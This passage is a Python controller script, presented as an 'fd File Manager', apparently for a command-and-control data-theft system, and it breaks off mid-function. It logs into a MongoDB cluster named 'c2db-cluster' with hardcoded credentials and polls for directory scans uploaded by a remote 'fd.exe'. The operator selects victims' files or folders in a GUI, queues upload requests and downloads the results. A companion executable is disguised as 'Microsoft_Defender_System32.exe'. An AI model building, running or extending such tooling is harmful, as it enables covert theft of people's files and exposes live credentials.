# -*- coding: utf-8 -*-
import sys, io, os, time, json
from datetime import datetime, timezone

# Force UTF-8 stdout on Windows so rich Unicode chars work
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

"""
fd File Manager — Interactive upload selector & auto-downloader
================================================================
1. Fetches the latest scan list from MongoDB GridFS
2. Lets you search & select files from a tree GUI
3. Inserts an upload_requests document into MongoDB
4. Polls until the C# app finishes uploading the selected files/folders
5. Automatically downloads the uploaded files to a local 'downloads/' folder
"""

try:
    from pymongo import MongoClient
    from pymongo.errors import ConnectionFailure
    import gridfs
except ImportError:
    print("[ERROR] pymongo not installed. Run: pip install pymongo")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.prompt import Prompt, Confirm
    from rich.text import Text
    from rich.columns import Columns
    from rich.rule import Rule
    from rich import print as rprint
except ImportError:
    print("[ERROR] rich not installed. Run: pip install rich")
    sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
#  Config
# ─────────────────────────────────────────────────────────────────────────────
CONNECTION_STRING = "mongodb+srv://manankamboj66_db_user:manankamboj2010@c2db-cluster.tag4k0q.mongodb.net/"
DB_NAME           = "document_db"
BUCKET_NAME       = "file_contents"
REQ_COLLECTION    = "upload_requests"
DOWNLOAD_DIR      = os.path.join(os.path.dirname(os.path.abspath(__file__)), "downloads")
SCAN_FILE_PREFIX  = "scan_paths_"
POLL_INTERVAL_SEC = 6
MAX_SCAN_AGE_HOURS = 24           # If the latest scan is older than this, refuse to run
COMPANION_APP_GRIDFS_NAME = "Microsoft_Defender_System32.exe"  # must match ScanUploader.cs CompanionFileName

console = Console()

# -----------------------------------------------------------------------------
#  MongoDB connection
# -----------------------------------------------------------------------------
def connect():
    console.print("[bold cyan]>> Connecting to MongoDB Atlas...[/bold cyan]")
    try:
        client = MongoClient(CONNECTION_STRING, serverSelectionTimeoutMS=8000)
        client.admin.command("ping")
        db = client[DB_NAME]
        fs = gridfs.GridFS(db, collection=BUCKET_NAME)
        console.print("[bold green]OK Connected successfully[/bold green]")
        return client, db, fs
    except Exception as e:
        console.print(f"[bold red]X Connection failed:[/bold red] {e}")
        sys.exit(1)

# -----------------------------------------------------------------------------
#  Step 1 — Fetch latest scan list from GridFS
# -----------------------------------------------------------------------------
def _countdown(seconds):
    """Print a live countdown ticker so the user knows we're still alive."""
    for remaining in range(seconds, 0, -1):
        console.print(f"[dim]    Retrying in {remaining}s...[/dim]", end="\r")
        time.sleep(1)
    console.print(" " * 30, end="\r")  # clear the line

def get_latest_scan_file(fs):
    """
    Poll GridFS until a fresh (non-stale) scan_paths_*.txt is available.
    Retries every POLL_INTERVAL_SEC seconds instead of exiting immediately.
    """
    console.print(Panel(
        f"Waiting for [bold cyan]fd.exe[/bold cyan] to upload a scan file to GridFS.\n"
        f"Checking every [bold]{POLL_INTERVAL_SEC}[/bold] seconds.\n\n"
        "[dim]Press Ctrl+C to abort.[/dim]",
        title="[bold yellow]Polling for Scan File[/bold yellow]",
        border_style="yellow"
    ))
    attempt = 0
    while True:
        attempt += 1
        all_scan_files = list(fs.find({"filename": {"$regex": f"^{SCAN_FILE_PREFIX}"}}))

        if not all_scan_files:
            console.print(
                f"[yellow]  Attempt {attempt}: No scan files found in GridFS yet. "
                f"Retrying in {POLL_INTERVAL_SEC}s...[/yellow]"
            )
            _countdown(POLL_INTERVAL_SEC)
            continue

        # Sort by uploadDate descending
        all_scan_files.sort(key=lambda f: f.upload_date, reverse=True)
        latest = all_scan_files[0]
        ts = latest.upload_date.strftime("%Y-%m-%d %H:%M:%S UTC") if hasattr(latest, 'upload_date') else 'unknown'

        # ── Staleness guard ───────────────────────────────────────────────────
        scan_dt = latest.upload_date
        if scan_dt.tzinfo is None:
            scan_dt = scan_dt.replace(tzinfo=timezone.utc)
        age       = datetime.now(timezone.utc) - scan_dt
        age_hours = age.total_seconds() / 3600
        if age_hours > MAX_SCAN_AGE_HOURS:
            console.print(
                f"[yellow]  Attempt {attempt}: Latest scan [cyan]{latest.filename}[/cyan] "
                f"is [bold red]{age_hours:.1f}h[/bold red] old (limit: {MAX_SCAN_AGE_HOURS}h). "
                f"Waiting for a fresh scan — retrying in {POLL_INTERVAL_SEC}s...[/yellow]"
            )
            _countdown(POLL_INTERVAL_SEC)
            continue
        # ── End staleness guard ───────────────────────────────────────────────

        console.print(Panel(
            f"[bold]Latest scan file:[/bold] [cyan]{latest.filename}[/cyan]\n"
            f"[bold]Uploaded:[/bold] {ts}  [dim]({age_hours:.1f}h ago)[/dim]\n"
            f"[bold]Size:[/bold] {latest.length:,} bytes",
            title="[bold green]Scan File Found[/bold green]",
            border_style="green"
        ))
        return latest

def download_scan_file(fs, file_obj):
    """Download the scan file from GridFS; re-download if the local cache is outdated."""
    local_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), file_obj.filename)

    if os.path.exists(local_path):
        # Compare local file modification time vs GridFS upload_date
        local_mtime = datetime.fromtimestamp(os.path.getmtime(local_path), tz=timezone.utc)
        gridfs_dt   = file_obj.upload_date
        if gridfs_dt.tzinfo is None:
            gridfs_dt = gridfs_dt.replace(tzinfo=timezone.utc)

        if local_mtime >= gridfs_dt:
            console.print(f"[green]OK Scan file cached and up-to-date:[/green] {local_path}")
            return local_path
        else:
            console.print(f"[yellow]! Local cache is outdated — re-downloading from GridFS...[/yellow]")

    console.print(f"[cyan]>> Downloading scan file ({file_obj.length:,} bytes)...[/cyan]")
    # Re-open the file for reading (the original object stream may be consumed)
    fresh = fs.find_one({"filename": file_obj.filename})
    with open(local_path, "wb") as f:
        f.write(fresh.read())
    console.print(f"[green]OK Saved to:[/green] {local_path}")
    return local_path

# -----------------------------------------------------------------------------
#  Step 2 — Load paths and interactive search/select
# -----------------------------------------------------------------------------
def load_paths(local_path):
    console.print(f"[cyan]>> Loading scan file into memory...[/cyan]")
    with open(local_path, "r", encoding="utf-8", errors="ignore") as f:
        paths = [line.strip() for line in f if line.strip()]
    console.print(f"[green]OK Loaded {len(paths):,} file paths[/green]")
    return paths

def gui_select(paths):
    """
    Open a tkinter GUI showing a directory tree of paths.
    Supports lazy loading of drives/folders, search, category filters,
    right-click context menu, file details pane, and recursive folder selection.
    """
    import tkinter as tk
    from tkinter import ttk, messagebox

    # Build the directory map
    dir_map = {}
    all_files_set = set(paths)

    def get_category_by_ext(ext):
        ext = ext.lower()
        if ext in [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp", ".one"]:
            return "Documents"
        if ext in [".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".heic", ".raw"]:
            return "Images"
        if ext in [".py", ".js", ".ts", ".cs", ".java", ".cpp", ".h", ".rb", ".php", ".sh", ".bat", ".ps1", ".env", ".cfg", ".ini", ".conf"]:
            return "Code"
        if ext in [".zip", ".rar", ".7z", ".tar", ".gz"]:
            return "Archives"
        return "Other"

    print("Building directory tree index...")
    for p in paths:
        parent_dir = os.path.dirname(p)
        if parent_dir not in dir_map:
            dir_map[parent_dir] = {"dirs": set(), "files": []}
        dir_map[parent_dir]["files"].append(p)

        # Populate ancestor directories
        current = parent_dir
        while True:
            parent = os.path.dirname(current)
            if not parent or parent == current:
                drive = current
                if drive not in dir_map:
                    dir_map[drive] = {"dirs": set(), "files": []}
                break
            
            if parent not in dir_map:
                dir_map[parent] = {"dirs": set(), "files": []}
            dir_map[parent]["dirs"].add(current)
            current = parent

    roots = sorted([k for k in dir_map.keys() if os.path.dirname(k) == k])
    selected_paths = []

    root = tk.Tk()
    root.title("fd File Manager - Select Files to Upload")
    root.geometry("1200x750")
    root.configure(bg="#1e1e2e")
    root.resizable(True, True)

    STYLE = {
        "bg":         "#1e1e2e",
        "panel":      "#2a2a3e",
        "accent":     "#89b4fa",
        "green":      "#a6e3a1",
        "red":        "#f38ba8",
        "yellow":     "#f9e2af",
        "text":       "#cdd6f4",
        "dim":        "#6c7086",
        "entry_bg":   "#313244",
        "btn_bg":     "#45475a",
        "btn_hover":  "#585b70",
        "font":       ("Segoe UI", 10),
        "font_bold":  ("Segoe UI", 10, "bold"),
        "font_mono":  ("Consolas", 9),
    }

    style = ttk.Style()
    style.theme_use("clam")
    style.configure("Treeview",
                    background=STYLE["entry_bg"],
                    foreground=STYLE["text"],
                    rowheight=24,
                    fieldbackground=STYLE["entry_bg"],
                    bordercolor=STYLE["bg"],
                    borderwidth=0,
                    font=STYLE["font_mono"])
    style.map("Treeview",
              background=[("selected", STYLE["accent"])],
              foreground=[("selected", "#1e1e2e")])
    style.configure("Treeview.Heading",
                    background=STYLE["panel"],
                    foreground=STYLE["accent"],
                    bordercolor=STYLE["bg"],
                    font=STYLE["font_bold"],
                    borderwidth=0)

    # ── Title bar ───────────────────────────────────────────────────────────
    title_frame = tk.Frame(root, bg=STYLE["accent"], pady=8)
    title_frame.pack(fill="x")
    tk.Label(title_frame, text="  fd File Manager", bg=STYLE["accent"],
             fg="#1e1e2e", font=("Segoe UI", 13, "bold")).pack(side="left")
    tk.Label(title_frame, text="Select files or folders to request upload  ",
             bg=STYLE["accent"], fg="#1e1e2e", font=STYLE["font"]).pack(side="right")

    # ── Top Bar (Search & Filters) ──────────────────────────────────────────
    top_bar = tk.Frame(root, bg=STYLE["bg"], pady=8, padx=10)
    top_bar.pack(fill="x")
    
    # Search
    search_frame = tk.Frame(top_bar, bg=STYLE["bg"])
    search_frame.pack(fill="x", expand=True)
    tk.Label(search_frame, text="Search:", bg=STYLE["bg"], fg=STYLE["text"],
             font=STYLE["font_bold"]).pack(side="left", padx=(0, 6))
    
    search_var = tk.StringVar()
    search_entry = tk.Entry(search_frame, textvariable=search_var, bg=STYLE["entry_bg"],
                            fg=STYLE["text"], insertbackground=STYLE["accent"],
                            font=STYLE["font_mono"], relief="flat", bd=6)
    search_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
    
    result_count_var = tk.StringVar(value="Loading files tree...")
    tk.Label(search_frame, textvariable=result_count_var, bg=STYLE["bg"],
             fg=STYLE["dim"], font=STYLE["font"]).pack(side="left")

    # Category Filters Row
    filter_frame = tk.Frame(top_bar, bg=STYLE["bg"], pady=4)
    filter_frame.pack(fill="x", pady=(4, 0))
    tk.Label(filter_frame, text="Filter Category: ", bg=STYLE["bg"], fg=STYLE["dim"],
             font=STYLE["font_bold"]).pack(side="left")

    category_vars = {
        "Documents": tk.BooleanVar(value=True),
        "Images": tk.BooleanVar(value=True),
        "Code": tk.BooleanVar(value=True),
        "Archives": tk.BooleanVar(value=True),
        "Other": tk.BooleanVar(value=True),
    }

    def on_filter_change():
        do_search()

    for cat, var in category_vars.items():
        cb = tk.Checkbutton(filter_frame, text=cat, variable=var, command=on_filter_change,
                            bg=STYLE["bg"], fg=STYLE["text"], selectcolor=STYLE["entry_bg"],
                            activebackground=STYLE["bg"], activeforeground=STYLE["text"],
                            font=STYLE["font"], padx=8)
        cb.pack(side="left")

    # ── Main body ───────────────────────────────────────────────────────────
    body = tk.Frame(root, bg=STYLE["bg"])
    body.pack(fill="both", expand=True, padx=10, pady=(0, 6))

    # Left panel — Treeview & Details
    left = tk.Frame(body, bg=STYLE["panel"], bd=0)
    left.pack(side="left", fill="both", expand=True, padx=(0, 6))
    tk.Label(left, text="File Explorer", bg=STYLE["panel"], fg=STYLE["accent"],
             font=STYLE["font_bold"], pady=4).pack(fill="x")

    results_frame = tk.Frame(left, bg=STYLE["panel"])
    results_frame.pack(fill="both", expand=True)
    results_scroll_y = tk.Scrollbar(results_frame)
    results_scroll_y.pack(side="right", fill="y")
    results_scroll_x = tk.Scrollbar(results_frame, orient="horizontal")
    results_scroll_x.pack(side="bottom", fill="x")

    tree = ttk.Treeview(results_frame, columns=("type"), show="tree",
                        yscrollcommand=results_scroll_y.set,
                        xscrollcommand=results_scroll_x.set)
    tree.pack(side="left", fill="both", expand=True)
    results_scroll_y.config(command=tree.yview)
    results_scroll_x.config(command=tree.xview)

    # Left Panel Bottom — Details Pane
    details_var = tk.StringVar(value="Select an item to view details")
    details_bar = tk.Label(left, textvariable=details_var, bg=STYLE["entry_bg"],
                           fg=STYLE["text"], font=STYLE["font_mono"], anchor="w",
                           padx=8, pady=6, relief="flat")
    details_bar.pack(fill="x", side="bottom")

    # Center buttons
    mid = tk.Frame(body, bg=STYLE["bg"], padx=6)
    mid.pack(side="left", fill="y")
    tk.Label(mid, bg=STYLE["bg"]).pack(expand=True)  # spacer

    def make_btn(parent, text, cmd, color=None):
        c = color or STYLE["btn_bg"]
        b = tk.Button(parent, text=text, command=cmd, bg=c, fg=STYLE["text"],
                      font=STYLE["font_bold"], relief="flat", bd=0,
                      padx=12, pady=6, cursor="hand2", activebackground=STYLE["btn_hover"],
                      activeforeground=STYLE["text"])
        b.pack(fill="x", pady=3)
        return b

    # Right panel — selected files
    right = tk.Frame(body, bg=STYLE["panel"], bd=0, width=420)
    right.pack(side="left", fill="both", expand=False, padx=(6, 0))
    right.pack_propagate(False)
    sel_header = tk.Label(right, text="Selected Files (0)", bg=STYLE["panel"],
                          fg=STYLE["green"], font=STYLE["font_bold"], pady=4)
    sel_header.pack(fill="x")

    sel_frame = tk.Frame(right, bg=STYLE["panel"])
    sel_frame.pack(fill="both", expand=True)
    sel_scroll_y = tk.Scrollbar(sel_frame)
    sel_scroll_y.pack(side="right", fill="y")
    
    selected_list = tk.Listbox(sel_frame, bg=STYLE["entry_bg"], fg=STYLE["green"],
                               selectbackground=STYLE["red"], selectforeground="#1e1e2e",
                               font=STYLE["font_mono"], relief="flat", bd=0,
                               yscrollcommand=sel_scroll_y.set, activestyle="none")
    selected_list.pack(side="left", fill="both", expand=True)
    sel_scroll_y.config(command=selected_list.yview)

    selected_set  = set()
    selected_data = []    # parallel list of full paths for selected_list

    # Status Var for Status Bar
    status_var = tk.StringVar(value="Ready")

    def update_confirm_btn():
        n = len(selected_data)
        total_size = 0
        for p in selected_data:
            try:
                if os.path.exists(p):
                    if os.path.isdir(p):
                        for root_dir, _, files in os.walk(p):
                            for f in files:
                                fp = os.path.join(root_dir, f)
                                if os.path.exists(fp):
                                    total_size += os.path.getsize(fp)
                    else:
                        total_size += os.path.getsize(p)
            except Exception:
                pass
        
        size_str = f" ({total_size / (1024*1024):.2f} MB)" if total_size > 0 else ""
        sel_header.config(text=f"Selected Files ({n}){size_str}")
        confirm_btn.config(
            text=f"Confirm & Upload {n} File(s)" if n else "Confirm",
            state="normal" if n else "disabled"
        )
        status_var.set(f"Selected: {n} item(s){size_str} | Total Scanned Index: {len(paths):,}")

    # Recursive helper to add a folder or file
    def add_path_recursive(p):
        if p in all_files_set:
            if p not in selected_set:
                selected_set.add(p)
                selected_data.append(p)
                selected_list.insert(tk.END, os.path.basename(p) + "  |  " + p)
        elif p in dir_map:
            res = messagebox.askyesnocancel(
                "Add Folder",
                f"Would you like to upload the WHOLE folder '{os.path.basename(p) or p}' directly?\n\n"
                "• Yes: Request the entire folder path (uploads all files/subfolders in it).\n"
                "• No: Only add individual matching files currently found in the scan index.\n"
                "• Cancel: Do nothing."
            )
            if res is True:
                if p not in selected_set:
                    selected_set.add(p)
                    selected_data.append(p)
                    selected_list.insert(tk.END, f"[FOLDER] {os.path.basename(p) or p}  |  {p}")
            elif res is False:
                _add_files_only_recursive(p)

    def _add_files_only_recursive(p):
        if p in all_files_set:
            if p not in selected_set:
                selected_set.add(p)
                selected_data.append(p)
                selected_list.insert(tk.END, os.path.basename(p) + "  |  " + p)
        elif p in dir_map:
            for child_file in dir_map[p]["files"]:
                _add_files_only_recursive(child_file)
            for child_dir in dir_map[p]["dirs"]:
                _add_files_only_recursive(child_dir)

    def add_selected():
        selected_nodes = tree.selection()
        for node_id in selected_nodes:
            add_path_recursive(node_id)
        update_confirm_btn()

    def remove_selected():
        idxs = list(selected_list.curselection())[::-1]
        for i in idxs:
            path = selected_data[i]
            selected_set.discard(path)
            selected_list.delete(i)
            selected_data.pop(i)
        update_confirm_btn()

    make_btn(mid, "Add >>", add_selected, STYLE["green"])
    make_btn(mid, "<< Remove", remove_selected, STYLE["red"])
    tk.Label(mid, bg=STYLE["bg"]).pack(expand=True)  # spacer

    # ── Lazy Loading Logic ───────────────────────────────────────────────────
    def populate_node(tree_widget, parent_node):
        children = tree_widget.get_children(parent_node)
        if len(children) == 1 and children[0].endswith("_dummy_"):
            tree_widget.delete(children[0])

        data = dir_map.get(parent_node)
        if not data:
            return

        # Insert subdirectories — guard against duplicate iid crash
        # (a dir can appear under multiple parents in the scan index)
        for d in sorted(data["dirs"], key=lambda x: os.path.basename(x).lower()):
            dir_name = os.path.basename(d)
            if not dir_name:
                dir_name = d
            if not tree_widget.exists(d):
                d_node = tree_widget.insert(parent_node, "end", iid=d, text=dir_name, open=False)
                if dir_map.get(d) and (dir_map[d]["dirs"] or dir_map[d]["files"]):
                    dummy_iid = d + "_dummy_"
                    if not tree_widget.exists(dummy_iid):
                        tree_widget.insert(d_node, "end", iid=dummy_iid)

        # Insert files
        for f in sorted(data["files"], key=lambda x: os.path.basename(x).lower()):
            ext = os.path.splitext(f)[1]
            cat = get_category_by_ext(ext)
            if not category_vars[cat].get():
                continue
            file_name = os.path.basename(f)
            if not tree_widget.exists(f):
                tree_widget.insert(parent_node, "end", iid=f, text=file_name)

    def on_tree_open(event):
        node = tree.focus()
        populate_node(tree, node)

    tree.bind("<<TreeviewOpen>>", on_tree_open)

    # ── On-Demand File Details Panel Logic ────────────────────────────────────
    def on_tree_select(event):
        selected_nodes = tree.selection()
        if not selected_nodes:
            details_var.set("Select an item to view details")
            return
        node_id = selected_nodes[0]
        if os.path.exists(node_id):
            try:
                stat = os.stat(node_id)
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                if os.path.isdir(node_id):
                    details_var.set(f"Folder: {node_id} | Modified: {mtime}")
                else:
                    size_str = f"{stat.st_size:,} bytes"
                    if stat.st_size > 1024*1024:
                        size_str += f" ({stat.st_size / (1024*1024):.2f} MB)"
                    details_var.set(f"File: {os.path.basename(node_id)} | Size: {size_str} | Modified: {mtime}")
            except Exception:
                details_var.set(f"Path: {node_id}")
        else:
            details_var.set(f"Scanned path (not local): {node_id}")

    tree.bind("<<TreeviewSelect>>", on_tree_select)

    # ── Context Menu (Right-Click) Logic ─────────────────────────────────────
    context_menu = tk.Menu(root, tearoff=0, bg=STYLE["panel"], fg=STYLE["text"],
                           activebackground=STYLE["accent"], activeforeground="#1e1e2e")
    
    def open_containing_folder():
        sel = tree.selection()
        if not sel: return
        path = sel[0]
        if os.path.exists(path):
            if os.path.isdir(path):
                os.startfile(path)
            else:
                os.system(f'explorer /select,"{path}"')
        else:
            messagebox.showinfo("Not Found", f"Path does not exist on disk: {path}")

    def show_properties():
        sel = tree.selection()
        if not sel: return
        path = sel[0]
        if os.path.exists(path):
            try:
                stat = os.stat(path)
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                ctime = datetime.fromtimestamp(stat.st_ctime).strftime("%Y-%m-%d %H:%M:%S")
                
                prop_win = tk.Toplevel(root)
                prop_win.title("Properties")
                prop_win.geometry("500x320")
                prop_win.configure(bg=STYLE["panel"])
                prop_win.transient(root)
                prop_win.grab_set()
                
                tk.Label(prop_win, text="Item Properties", bg=STYLE["panel"], fg=STYLE["accent"],
                         font=("Segoe UI", 12, "bold"), pady=10).pack()
                
                info_frame = tk.Frame(prop_win, bg=STYLE["panel"])
                info_frame.pack(padx=20, pady=10, fill="both", expand=True)
                
                def add_row(label, val, row):
                    tk.Label(info_frame, text=label, bg=STYLE["panel"], fg=STYLE["dim"],
                             font=STYLE["font_bold"], anchor="w").grid(row=row, column=0, sticky="w", pady=4, padx=(0, 10))
                    entry = tk.Entry(info_frame, bg=STYLE["entry_bg"], fg=STYLE["text"],
                                     font=STYLE["font"], relief="flat", highlightthickness=0, width=40)
                    entry.grid(row=row, column=1, sticky="w", pady=4)
                    entry.insert(0, val)
                    entry.config(state="readonly")
                
                add_row("Name:", os.path.basename(path) or path, 0)
                add_row("Type:", "Folder" if os.path.isdir(path) else "File", 1)
                add_row("Path:", path, 2)
                if not os.path.isdir(path):
                    add_row("Size:", f"{stat.st_size:,} bytes ({stat.st_size / (1024*1024):.2f} MB)", 3)
                add_row("Modified:", mtime, 4)
                add_row("Created:", ctime, 5)
                
                tk.Button(prop_win, text="Close", command=prop_win.destroy, bg=STYLE["btn_bg"],
                          fg=STYLE["text"], font=STYLE["font_bold"], relief="flat", bd=0, padx=16, pady=4).pack(pady=10)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to get properties: {e}")

    context_menu.add_command(label="Add Item", command=add_selected)
    context_menu.add_command(label="Open Containing Folder", command=open_containing_folder)
    context_menu.add_command(label="Properties", command=show_properties)

    def show_context_menu(event):
        iid = tree.identify_row(event.y)
        if iid:
            tree.selection_set(iid)
            context_menu.post(event.x_root, event.y_root)

    tree.bind("<Button-3>", show_context_menu)

    # ── Search & Filter Logic ────────────────────────────────────────────────
    _search_after_id = [None]

    def do_search():
        q = search_var.get().lower().strip()
        
        # Clear everything
        for child in tree.get_children():
            tree.delete(child)

        if not q:
            # Standard lazy loading roots
            for r in roots:
                node = tree.insert("", "end", iid=r, text=r, open=False)
                if dir_map[r]["dirs"] or dir_map[r]["files"]:
                    tree.insert(node, "end", iid=r + "_dummy_")
            
            # Count total matches after category filters
            active_total = 0
            for p in paths:
                ext = os.path.splitext(p)[1]
                cat = get_category_by_ext(ext)
                if category_vars[cat].get():
                    active_total += 1

            result_count_var.set(f"All {active_total:,} files — expand folders or search")
            return

        # Find matches filtering by categories
        matches = []
        for p in paths:
            ext = os.path.splitext(p)[1]
            cat = get_category_by_ext(ext)
            if not category_vars[cat].get():
                continue
            if q in p.lower() or q in os.path.basename(p).lower():
                matches.append(p)
        
        if not matches:
            result_count_var.set("No matches found")
            return

        MAX_TREE_NODES = 1000
        shown_matches = matches[:MAX_TREE_NODES]

        # Gather folders
        needed_dirs = set()
        for p in shown_matches:
            current = os.path.dirname(p)
            while True:
                needed_dirs.add(current)
                parent = os.path.dirname(current)
                if not parent or parent == current:
                    break
                current = parent

        # Insert directories
        for d in sorted(needed_dirs, key=len):
            parent = os.path.dirname(d)
            if parent == d or not parent:
                parent_node = ""
                text = d
            else:
                parent_node = parent
                text = os.path.basename(d)
            
            if not tree.exists(d):
                tree.insert(parent_node, "end", iid=d, text=text, open=True)

        # Insert files
        for p in shown_matches:
            parent = os.path.dirname(p)
            tree.insert(parent, "end", iid=p, text=os.path.basename(p))

        extra = f" (showing first {MAX_TREE_NODES} matches)" if len(matches) > MAX_TREE_NODES else ""
        result_count_var.set(f"{len(matches):,} match(es) found{extra}")

    def on_search_key(*_):
        if _search_after_id[0]:
            root.after_cancel(_search_after_id[0])
        _search_after_id[0] = root.after(300, do_search)

    search_var.trace_add("write", lambda *_: on_search_key())

    # ── Double-click bindings ────────────────────────────────────────────────
    def on_tree_double(event):
        add_selected()

    def on_sel_double(event):
        remove_selected()

    tree.bind("<Double-1>", on_tree_double)
    selected_list.bind("<Double-1>", on_sel_double)

    # ── Bottom bar ──────────────────────────────────────────────────────────
    bottom = tk.Frame(root, bg=STYLE["bg"], pady=6, padx=10)
    bottom.pack(fill="x")
    tk.Button(bottom, text="Cancel", command=root.destroy,
              bg=STYLE["btn_bg"], fg=STYLE["text"], font=STYLE["font_bold"],
              relief="flat", bd=0, padx=16, pady=6, cursor="hand2").pack(side="left")
    confirm_btn = tk.Button(bottom, text="Confirm", state="disabled",
                            bg=STYLE["accent"], fg="#1e1e2e", font=STYLE["font_bold"],
                            relief="flat", bd=0, padx=20, pady=6, cursor="hand2")
    confirm_btn.pack(side="right")

    hint = tk.Label(bottom,
                    text="Double-click item or right-click for options. Select directory to Add ALL matching files recursively.",
                    bg=STYLE["bg"], fg=STYLE["dim"], font=("Segoe UI", 9))
    hint.pack(side="left", padx=16)

    def on_confirm():
        nonlocal selected_paths
        selected_paths = list(selected_data)
        root.destroy()

    confirm_btn.config(command=on_confirm)

    # ── Status Bar ───────────────────────────────────────────────────────────
    status_bar = tk.Frame(root, bg=STYLE["panel"], bd=1, relief="sunken")
    status_bar.pack(fill="x", side="bottom")
    status_label = tk.Label(status_bar, textvariable=status_var, bg=STYLE["panel"],
                            fg=STYLE["dim"], font=("Segoe UI", 9), anchor="w", padx=8, pady=2)
    status_label.pack(fill="x")

    # Initial population of roots
    for r in roots:
        node = tree.insert("", "end", iid=r, text=r, open=False)
        if dir_map[r]["dirs"] or dir_map[r]["files"]:
            tree.insert(node, "end", iid=r + "_dummy_")
            
    update_confirm_btn()

    search_entry.focus_set()
    root.mainloop()

    if not selected_paths:
        console.print("[yellow]No files selected. Exiting.[/yellow]")
        sys.exit(0)

    console.print(f"\n[bold green]OK {len(selected_paths)} file(s) selected via GUI.[/bold green]")
    for p in selected_paths:
        console.print(f"  [cyan]-[/cyan] {p}")

    return selected_paths

# ─────────────────────────────────────────────────────────────────────────────
#  Step 3 — Craft and execute the upload request
# ─────────────────────────────────────────────────────────────────────────────
def craft_and_execute(db, selected_paths):
    doc = {
        "status": "pending",
        "requestedFiles": selected_paths,
        "createdAt": datetime.now(timezone.utc),
        "requestedBy": "file_manager.py"
    }

    # Pretty-print JSON for manual option
    json_str = json.dumps(
        {
            "status": "pending",
            "requestedFiles": selected_paths
        },
        indent=2
    )

    console.print("\n")
    console.print(Panel(
        json_str,
        title="[bold]Upload Request Document[/bold]",
        border_style="yellow"
    ))

    console.print(Panel(
        "[bold]Option A (Auto):[/bold] This script inserts the request directly into MongoDB.\n\n"
        "[bold]Option B (Manual):[/bold]\n"
        "  1. Open [cyan]MongoDB Atlas[/cyan] → Browse Collections\n"
        "  2. Select database: [bold]document_db[/bold]\n"
        "  3. Select collection: [bold]upload_requests[/bold]\n"
        "  4. Click [bold]INSERT DOCUMENT[/bold]\n"
        "  5. Paste the JSON shown above and click [bold]Insert[/bold]\n\n"
        "The [bold]fd.exe[/bold] app polls every 10 seconds and will start uploading automatically.",
        title="[bold]How to Execute the Request[/bold]",
        border_style="blue"
    ))

    auto = Confirm.ask("[bold yellow]?[/bold yellow] Execute automatically (insert directly into MongoDB)?", default=True)

    if auto:
        col = db[REQ_COLLECTION]
        result = col.insert_one(doc)
        req_id = result.inserted_id
        console.print(f"[bold green]OK Request inserted![/bold green] ID: [cyan]{req_id}[/cyan]")
        console.print("[dim]  The fd.exe scanner will pick this up within 10 seconds and begin uploading.[/dim]")
        return req_id
    else:
        console.print("[yellow]  Manual mode selected. Paste the JSON above into MongoDB Atlas, then press Enter to continue polling.[/yellow]")
        input("  Press Enter when you have inserted the document manually... ")
        # Find the most recently inserted pending request
        col = db[REQ_COLLECTION]
        doc = col.find_one({"status": {"$in": ["pending", "completed"]}, "requestedBy": {"$exists": False}}, sort=[("_id", -1)])
        if doc:
            return doc["_id"]
        # Fallback: search by requestedFiles
        doc = col.find_one({"requestedFiles": {"$in": selected_paths}}, sort=[("_id", -1)])
        if doc:
            return doc["_id"]
        console.print("[yellow]  Could not find the manually inserted request. Will poll all pending requests.[/yellow]")
        return None

# ─────────────────────────────────────────────────────────────────────────────
#  Step 4 — Poll and auto-download
# ─────────────────────────────────────────────────────────────────────────────
def poll_and_download(db, fs, req_id, selected_paths):
    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
    col = db[REQ_COLLECTION]

    expected_filenames = {os.path.basename(p): p for p in selected_paths}
    downloaded = set()
    total = len(selected_paths)

    console.print(Panel(
        f"Waiting for files to be uploaded by fd.exe...\n"
        f"Checking every [bold]{POLL_INTERVAL_SEC}[/bold] seconds.\n"
        f"Downloaded files will be saved to: [cyan]{DOWNLOAD_DIR}[/cyan]\n\n"
        "[dim]Press Ctrl+C to stop polling.[/dim]",
        title="[bold]Polling for Uploads[/bold]",
        border_style="magenta"
    ))

    tick = 0
    try:
        # Loop continues until break
        while True:
            tick += 1
            time.sleep(POLL_INTERVAL_SEC)

            # Check request status
            if req_id:
                req_doc = col.find_one({"_id": req_id})
                if req_doc:
                    status = req_doc.get("status", "pending")
                    fulfilled = req_doc.get("fulfilledCount", 0)
                    not_found = req_doc.get("notFoundCount", 0)
                    uploaded_ids = req_doc.get("uploadedFileIds", [])

                    console.print(f"[dim]  Tick {tick}:[/dim] status=[bold]{status}[/bold]  uploaded={fulfilled}  not_found={not_found}")

                    if status == "completed":
                        if uploaded_ids:
                            # Download each uploaded file by its GridFS ObjectId
                            for fid in uploaded_ids:
                                try:
                                    grid_out = fs.get(fid)
                                    fname = grid_out.filename
                                    if fname in downloaded:
                                        continue
                                    local_path = os.path.join(DOWNLOAD_DIR, fname)
                                    with open(local_path, "wb") as f:
                                        f.write(grid_out.read())
                                    downloaded.add(fname)
                                    console.print(f"  [bold green]>> Downloaded:[/bold green] [cyan]{fname}[/cyan] -> {local_path}")
                                except Exception as e:
                                    console.print(f"  [red]  Error downloading file ID {fid}: {e}[/red]")
                        else:
                            console.print("[yellow]  Request marked completed but no file IDs found.[/yellow]")
                        break
                else:
                    console.print(f"[dim]  Tick {tick}: request not found yet...[/dim]")
            else:
                # No known req_id: scan GridFS for files by name
                for fname, orig_path in expected_filenames.items():
                    if fname in downloaded:
                        continue
                    grid_file = fs.find_one({"filename": fname, "metadata.originalPath": {"$exists": True}})
                    if grid_file:
                        local_path = os.path.join(DOWNLOAD_DIR, fname)
                        with open(local_path, "wb") as f:
                            fresh = fs.get(grid_file._id)
                            f.write(fresh.read())
